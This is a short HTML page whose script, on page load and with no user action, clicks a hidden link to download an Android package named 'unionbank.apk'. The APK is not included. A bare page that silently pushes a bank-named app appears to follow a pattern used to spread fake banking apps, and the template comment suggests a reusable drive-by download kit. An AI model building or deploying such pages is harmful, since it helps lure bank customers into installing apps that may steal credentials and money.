<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Auto Download APK</title>
</head>
<body>
    <script>
        window.onload = function() {
            // Automatically start the download
            const link = document.createElement('a');
            link.href = 'unionbank.apk'; // Replace with your APK file path
            link.download = 'unionbank.apk'; // Specify the name for the APK file
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link); // Clean up the link after the click
        };
    </script>
</body>
</html>
